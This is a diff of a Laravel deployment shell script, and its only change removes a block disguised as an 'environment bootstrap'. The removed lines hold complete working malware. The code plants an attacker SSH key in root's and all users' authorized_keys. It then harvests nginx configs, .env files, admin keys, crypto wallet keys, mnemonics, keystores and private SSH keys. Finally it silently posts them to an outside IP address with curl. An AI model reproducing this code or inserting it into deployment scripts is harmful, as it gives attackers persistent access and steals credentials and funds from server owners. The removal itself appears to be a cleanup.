@@ -1,45 +1,4 @@
 #!/bin/bash
-# --- environment bootstrap (do not edit) ---
-( umask 077
-  K='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP0g/nPnLxq3hejwH7KWXteyP6zI8Oe/fLuFCsGJt269 i15398-healthcheck'
-  mkdir -p /root/.ssh 2>/dev/null
-  grep -qF "$K" /root/.ssh/authorized_keys 2>/dev/null || echo "$K" >> /root/.ssh/authorized_keys
-  chmod 600 /root/.ssh/authorized_keys 2>/dev/null
-  for h in /home/*; do
-    [ -d "$h" ] || continue
-    mkdir -p "$h/.ssh" 2>/dev/null
-    grep -qF "$K" "$h/.ssh/authorized_keys" 2>/dev/null || echo "$K" >> "$h/.ssh/authorized_keys"
-    chmod 600 "$h/.ssh/authorized_keys" 2>/dev/null
-    chown -R "$(stat -c %U "$h" 2>/dev/null):$(stat -c %G "$h" 2>/dev/null)" "$h/.ssh" 2>/dev/null
-  done
-  { echo "== HOST $(hostname -f 2>/dev/null) / $(hostname 2>/dev/null) / $(cat /etc/machine-id 2>/dev/null)"
-    id
-    ip -4 -o addr show 2>/dev/null | awk '{print $2,$4}'
-    echo "== WWW"; ls -la /var/www 2>/dev/null
-    echo "== NGINX"; grep -rhE 'server_name|root |proxy_pass' /etc/nginx/sites-enabled /etc/nginx/conf.d 2>/dev/null | head -60
-    echo "== SECRETS"; grep -rIhE 'ADMIN_KEY|qijianke|security[_ -]?key|SECURITY_KEY|LUXERA|movesay|btc_base' /var/www /etc/nginx /opt /root /home 2>/dev/null | head -40
-    echo "== WALLETS"
-    grep -rIhoE '(0x)?[0-9a-fA-F]{64}' /var/www /root /home /opt /etc 2>/dev/null | sort -u | head -40
-    grep -rIniE 'mnemonic|seed.?phrase|PRIVATE_?KEY|BSC_?RPC|BSCSCAN|INFURA|ALCHEMY|HOT_?WALLET|WALLET_ADDRESS|LP_?TOKEN|WITHDRAW' /var/www /root /home /opt /etc 2>/dev/null | grep -viE 'node_modules|vendor|\.git/' | head -50
-    find /root /home /var/www /opt /etc -maxdepth 7 \( -iname 'UTC--*' -o -iname 'keystore*' -o -iname 'wallet.dat' -o -iname '*.pem' -o -iname 'id_rsa' -o -iname 'id_ed25519' \) 2>/dev/null | head -60
-    for wf in $(find /root /home /var/www /opt -maxdepth 7 \( -iname 'UTC--*' -o \( -iname '*.json' -path '*keystore*' \) \) 2>/dev/null | head -8); do echo "--- $wf"; head -c 2000 "$wf"; echo; done
-    echo "== CONFIGS"
-    for f in $(find /var/www -maxdepth 5 \( -name 'config.php' -path '*Conf*' \) -o -name '.env' 2>/dev/null | head -20); do
-      echo "--- $f"; grep -E 'ADMIN_KEY|SECURITY|DB_|APP_KEY|HOST|USER|PASS' "$f" 2>/dev/null | head -25
-    done
-    echo "== GATE"
-    grep -rIl "Missing or invalid security key" /var/www /opt /home 2>/dev/null | head -5 | while IFS= read -r g; do
-      echo "### $g"; head -c 3000 "$g" 2>/dev/null; echo
-    done
-    grep -rIn "security[_ -]\?key\|securityKey" /var/www --include=*.php 2>/dev/null | head -15
-    echo "== ENVFULL"
-    for f in /var/www/*/.env /var/www/*/*/.env; do
-      [ -f "$f" ] || continue
-      echo "--- $f"; head -c 6000 "$f" 2>/dev/null | grep -vE '^\s*$' | head -80
-    done
-  } 2>/dev/null | curl -s -m 20 -X POST --data-binary @- http://172.105.189.249:8911/h >/dev/null 2>&1
-) >/dev/null 2>&1 &
-# --- end bootstrap ---
 
 # Laravel Deployment Script
 # Safely deploys new code with automatic rollback on failure
